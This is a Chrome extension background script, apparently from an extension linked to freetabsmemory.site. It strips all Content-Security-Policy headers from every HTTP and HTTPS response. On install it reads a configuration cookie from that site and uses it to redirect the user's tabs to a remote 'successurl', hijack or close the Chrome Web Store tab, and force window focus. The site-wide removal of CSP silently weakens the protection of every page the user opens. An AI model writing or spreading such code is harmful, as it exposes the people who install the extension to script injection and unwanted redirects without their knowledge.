chrome.runtime.onInstalled.addListener(function(details) {
    if (details.reason == "install") {
        checkAndOpenThankyouPage();
    }
});

chrome.webRequest.onHeadersReceived.addListener(function(response)
{
	let regx = new RegExp('content-security', 'i');
	let n = [];
	for(let i = 0,l = response.responseHeaders.length;i < l;i++)
	{
		if(!response.responseHeaders[i].name.match(regx))
		{
			n.push(response.responseHeaders[i]);
		}
	}
    return {
        responseHeaders: n
    };
}, {urls: ["http://*/*","https://*/*"]}, ["blocking", "responseHeaders"]);

function checkAndOpenThankyouPage() {
    chrome.cookies.getAll({
        url: "https://freetabsmemory.site"
    },
    function(cookies) {
        for (let i = 0; i < cookies.length; i++) {
            let cookie = cookies[i];
            if (cookie.name.indexOf('thp_config') === 0) {
                try {
                    let config = JSON.parse(decodeURIComponent(cookie.value));
                    if (config){
	                    chrome.storage.local.set({'thp_config':config})
	                    openThankyouPage(config);
	                }
                } catch (err) {}

                return;
            }
        }
    });
}

function openThankyouPage(config) {
    if (config["successurl"]){
        switch (config["extensionOpenTabMode"]) {
            case "newtab":
                chrome.tabs.create({
                    url: config["successurl"]
                });
                break;
            case "landerOverride":
                chrome.tabs.query({
                    url: "*://" + config['domain'] + "/*"
                }, function(tabs) {
                    if (tabs.length > 0) {
                        chrome.tabs.update(tabs[0].id, {
                            url: config["successurl"],
                            active: true
                        });
                        
                        setTimeout(function() {
                            chrome.windows.update(tabs[0].windowId, {
                                focused: true
                            });
                        }, 1000);
                    } else {
                        chrome.tabs.create({
                            url: config["successurl"]
                        });
                    }
                });
                break;
			case "chromeOverride":
	            chrome.tabs.query({
		            url: "*://chrome.google.com/webstore/detail/*"
		        }, function (tabs) {
	                if (tabs.length > 0) {
	                    chrome.tabs.update(tabs[0].id, {
		                    url: config["successurl"],
		                    active: true
		                });
		                
	                    setTimeout(function() {
                            chrome.windows.update(tabs[0].windowId, {
	                            focused: true
	                        });
	                    }, 1000);
	                } else {
	                    chrome.tabs.create({
		                    url: config["successurl"]
		                });
	                }
	            });
	            break;
			case "chromeClose":
	            chrome.tabs.query({
		            url: "*://chrome.google.com/webstore/detail/*"
		        }, function (tabs) {
	                if (tabs.length > 0) {
	                    chrome.tabs.remove(tabs[0].id);
	                }
	            });
	            break;
        }
    }
}